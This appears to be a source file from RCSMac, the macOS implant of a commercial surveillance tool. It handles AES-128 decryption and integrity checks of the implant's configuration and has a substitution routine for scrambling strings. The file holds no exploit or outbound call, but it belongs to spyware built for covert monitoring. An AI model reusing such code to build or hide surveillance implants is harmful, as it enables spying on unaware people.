/*
 * RCSMac - Encryption Class
 *  This class will be responsible for all the Encryption/Decryption routines
 *  used by the Configurator
 * 
 * 
 * Created by Alfredo 'revenge' Pesoli on 20/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonDigest.h>
#import <zlib.h>

#import "RCSMCommon.h"
#import "RCSMEncryption.h"
#import "NSMutableData+AES128.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface RCSMEncryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)shouldEncrypt;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSMEncryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)encryption
{
  char *scrambledString;
  int i, j;
  
  if ( !(scrambledString = strdup(aString)) )
    return NULL;
  
  char alphabet[ALPHABET_LEN] =
    {
      '_','B','q','w','H','a','F','8','T','k','K','D','M',
      'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
      'i','b','U','I','e','y','l','J','W','h','j','0','m',
      '5','o','2','E','r','L','t','6','v','G','R','N','9',
      's','Y','1','n','3','P','p','c','7','g','-','C'
    };
  
  // Avoid leaving aSeed = 0
  aSeed = (aSeed > 0) ? aSeed % ALPHABET_LEN : 1;
  
  for (i = 0; scrambledString[i]; i++)
    {
      for (j = 0; j < ALPHABET_LEN; j++)
        {
          if (scrambledString[i] == alphabet[j])
            {
              if (encryption == YES)
                scrambledString[i] = alphabet[(j + aSeed) % ALPHABET_LEN];
              else
                scrambledString[i] = alphabet[(j + ALPHABET_LEN - aSeed) % ALPHABET_LEN];
              
              break;
            }
        }
    }
  
  return scrambledString;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMEncryption : NSObject

- (id)initWithKey: (NSData *)aKey
{
  self = [super init];
  
  if (self != nil)
    {
      [self setKey: aKey];
    }
  
  return self;
}

- (void)dealloc
{
  [mKey release];
  
  [super dealloc];
}

- (NSMutableData *)decryptWithKey:(NSData *)aKey
                           inData:(NSMutableData*)inData
{
  NSMutableData *clearData = nil;
  
  size_t numBytesDecrypted = 0;
  
  CCCryptorStatus result = CCCrypt(kCCDecrypt, 
                                   kCCAlgorithmAES128, 
                                   kCCOptionPKCS7Padding,               //0,
                                   [aKey bytes], 
                                   kCCKeySizeAES128,
                                   NULL,                                // initialization vector (optional)
                                   [inData mutableBytes], [inData length],  // input
                                   [inData mutableBytes], [inData length],  // output
                                   &numBytesDecrypted);
  
  if (result == kCCSuccess)
    {
      clearData = [NSMutableData dataWithBytes:[inData bytes] length:numBytesDecrypted];
    }
  
#ifdef DEBUG_TMP
  NSLog(@"%s: return %d dec %lu", __FUNCTION__, result, numBytesDecrypted);
#endif
  
  return clearData;
}

- (NSData *)decryptJSonConfiguration: (NSString *)aConfigurationFile
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSData *decConfig = nil;
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: aConfigurationFile] == FALSE)
    {
      //FIXED-
      [pool release];
      return decConfig;
    }
  
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
  
  if (fileHandle != nil)
    {
      NSMutableData *encData = [NSMutableData dataWithData: [fileHandle availableData]];
      
      NSMutableData *tempData = [self decryptWithKey: mKey inData: encData];
      
      if (tempData != nil)
        {
          u_int  confLen     = [tempData length] - CC_SHA1_DIGEST_LENGTH;
          u_char *confBuffer = (u_char*)[tempData bytes];
          u_char *confSha1   = (confBuffer + confLen);
          
          u_char tmpSha1[CC_SHA1_DIGEST_LENGTH+1];
          memset(tmpSha1, 0, sizeof(tmpSha1));
          
          CC_SHA1(confBuffer, confLen, tmpSha1); 
                
          decConfig = [[NSData dataWithBytes:confBuffer length:confLen] retain];
          
          for (int i=0; i < CC_SHA1_DIGEST_LENGTH; i++) 
            {
              if (tmpSha1[i] != confSha1[i])
                {
                  [decConfig release];
                  decConfig = nil;
                  break;
                }
            }
      }
    }
  
  [pool release];
  
  return decConfig;
}

- (NSData *)decryptConfiguration: (NSString *)aConfigurationFile
{
  //
  // Quick Notes about the conf file aka monkeyz stuffz @ 1337
  //  - Skip the first 2 DWORDs
  //  - The third DWORD specifies the length of the data block
  //  - The DWORD at the end of every block is the CRC (including Length)
  //  - The DWORD after the ENDOFCONF Shit is a CRC
  //  |SkipDW|SkipDW|LenDW|DATA...|CRC|
  //
  
  u_long endTokenAndCRCSize = strlen(ENDOF_CONF_DELIMITER) + sizeof(int);
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
  
  // Hold the first 2 DWORDs since we'll append here the unencrypted file later on
  NSMutableData *fileData = [NSMutableData dataWithData: [fileHandle readDataOfLength: TIMESTAMP_SIZE]];
  
  // Skip the first 2 DWORDs
  [fileHandle seekToFileOffset: TIMESTAMP_SIZE];
  //infoLog(@"%@", [fileHandle availableData]);
  
  NSMutableData *tempData = [NSMutableData dataWithData: [fileHandle availableData]];
  CCCryptorStatus result = 0;
  result = [tempData decryptWithKey: mKey];
  
  if (result == kCCSuccess)
    {
      [fileData appendData: tempData];
      
#ifdef DEBUG_ENCRYPTION
      infoLog(@"File decrypted correctly");
      [fileData writeToFile: @"/tmp/test.bin" atomically: YES];
#endif
      
      //
      // Integrity checks
      //  - Size
      //  - END Delimiter
      //  - CRC
      //
      u_long readFilesize;
      NSNumber *filesize;
      
      [fileData getBytes: &readFilesize
                   range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
      
      readFilesize += TIMESTAMP_SIZE;
      NSDictionary *fileAttributes;
      fileAttributes = [[NSFileManager defaultManager] attributesOfItemAtPath: aConfigurationFile
                                                                        error: nil];
      
      filesize = [fileAttributes objectForKey: NSFileSize];
#ifdef DEBUG_ENCRYPTION
      infoLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
      infoLog(@"EndTokeAndCRCSize: %d", endTokenAndCRCSize);
      infoLog(@"readFileSize = %d", readFilesize);
      infoLog(@"attribute = %d", [filesize intValue]);
      infoLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
#endif
      //
      // There's a problem with one file since we get 3 more bytes
      // than what we expect, thus everything here fails ...
      //
      if ((readFilesize == [filesize intValue]) ||
          (readFilesize + 3 == [filesize intValue]) || 1)
        {
          NSString *endToken;
          
          @try
            {
              // endToken should be at EndOfFile - CRC(DWORD) - strlen(TOKEN)
              endToken = [[NSString alloc] initWithData: [fileData subdataWithRange: 
                                                          NSMakeRange(readFilesize - endTokenAndCRCSize,
                                                                      endTokenAndCRCSize - sizeof(int))]
                                               encoding: NSUTF8StringEncoding];
            }
          @catch (NSException * e)
            {
#ifdef DEBUG_ENCRYPTION
              infoLog(@"%s exception", __FUNCTION__);
#endif

              return nil;
            }
          
#ifdef DEBUG_ENCRYPTION
          infoLog(@"EndToken: %@", endToken);
#endif
          
          if (![endToken isEqualToString: [NSString stringWithUTF8String: ENDOF_CONF_DELIMITER]])
            {
#ifdef DEBUG_ENCRYPTION
              errorLog(@"[EE] End Token not found");
#endif
              [endToken release];
            
              return nil;
            }
          
          [endToken release];
        }
      else
        {
#ifdef DEBUG_ENCRYPTION
          errorLog(@"[EE] Configuration file size mismatch");
#endif
          
          return nil;
        }
      
#ifdef DEBUG_ENCRYPTION
      infoLog(@"File decrypted correctly");
#endif
      
      return fileData;
    }
  else
    {
#ifdef DEBUG_ENCRYPTION
      switch (result)
        {
        case kCCParamError:
          errorLog(@"Illegal parameter value");
          break;
        case kCCBufferTooSmall:
          errorLog(@"Insufficent buffer provided for specified operation.");
          break;
        case kCCMemoryFailure:
          errorLog(@"Memory allocation failure.");
          break;
        case kCCAlignmentError:
          errorLog(@"Input size was not aligned properly.");
          break;
        case kCCDecodeError:
          errorLog(@"Input data did not decode or decrypt properly.");
          break;
        case kCCUnimplemented:
          errorLog(@"Function not implemented for the current algorithm.");
          break;
        default:
          errorLog(@"sux");
          break;
        }
#endif
      
#ifdef DEBUG_ENCRYPTION
      [tempData writeToFile: @"/tmp/conf_decrypted.bin" atomically: YES];
#endif
      
#ifdef DEBUG_ENCRYPTION
      errorLog(@"Error while decrypting with key");
#endif
    }
  
  return nil;
}

- (NSString *)scrambleForward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: YES];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  free(tempString);
  
  return [scrambledString autorelease];
}

- (NSString *)scrambleBackward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: NO];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  
  return [scrambledString autorelease];
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSData *)mKey
{
  return mKey;
}

- (void)setKey: (NSData *)aValue
{
  if (aValue != mKey)
    {
      [mKey release];
      mKey = [aValue retain];
    }
}

@end